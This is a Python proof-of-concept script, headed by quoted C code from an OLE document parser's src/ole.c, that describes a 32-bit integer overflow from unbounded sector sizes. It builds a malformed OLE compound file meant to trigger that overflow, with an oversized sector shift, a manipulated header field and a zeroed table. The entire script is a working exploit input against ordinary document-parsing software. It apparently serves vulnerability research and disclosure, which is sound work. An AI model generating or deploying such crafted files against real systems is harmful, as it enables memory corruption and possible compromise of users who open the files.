""" 32-bit integer overflow based on unbounded master sector sizes
src/ole.c:108-109
 	sectorSize = 1<<getshort(oleBuf,0x1e);
	shortSectorSize=1<<getshort(oleBuf,0x20);

src/ole.c:119-121
	if((BBD=malloc(bbdNumBlocks*sectorSize)) == NULL ) {
		return NULL;
	}

src/ole.c:162-177
	for(i=0; i< bbdNumBlocks; i++) {
		long int bbdSector=getlong(tmpBuf,4*i);

		if (bbdSector >= fileLength/sectorSize || bbdSector < 0) {
			fprintf(stderr, "Bad BBD entry!\n");
			ole_finish();
			return NULL;
		}
		fseek(newfile, 512+bbdSector*sectorSize, SEEK_SET);
		if ( fread(BBD+i*sectorSize, 1, sectorSize, newfile) != sectorSize ) {
			fprintf(stderr, "Can't read BBD!\n");
			free(tmpBuf);
			ole_finish();
			return NULL;
		}
	}
"""

import functools, operator, itertools, math
import ptypes, office.storage as storage, office.tools as tools
from ptypes import *

class u0(pint.uint_t): length = 0
class u8(pint.uint_t): length = 1
class u16(pint.uint_t): length = 2
class u32(pint.uint_t): length = 4
class u64(pint.uint_t): length = 8
class u128(pint.uint_t): length = 16
class s0(pint.sint_t): length = 0
class s8(pint.sint_t): length = 1
class s16(pint.sint_t): length = 2
class s32(pint.sint_t): length = 4
class s64(pint.sint_t): length = 8
class s128(pint.sint_t): length = 16

if __name__ == '__main__':
    import sys

    if len(sys.argv) != 2:
        print("Usage: {:s} outfile".format(sys.argv[0] if sys.argv else __file__))
        sys.exit(1)

    source = ptypes.setsource(ptypes.provider.empty())
    #source = ptypes.setsource(ptypes.prov.file(sys.argv[1], 'rb'))

    z = storage.File()
    z=z.a

    # we can also set this to 0. 
    z['sectorshift']['usectorshift'].set(math.trunc(math.log2(0x10000)))
    z['sectorshift']['uminisectorshift'].set(1)
    z.at(0x2c).set(0x10000)
    z['table'].set([0] * len(z['table']))

    source = ptypes.prov.file(sys.argv[1], 'wb')
    source.file.truncate(0x10000)
    z.commit(offset=0, source=source)
    source.close()
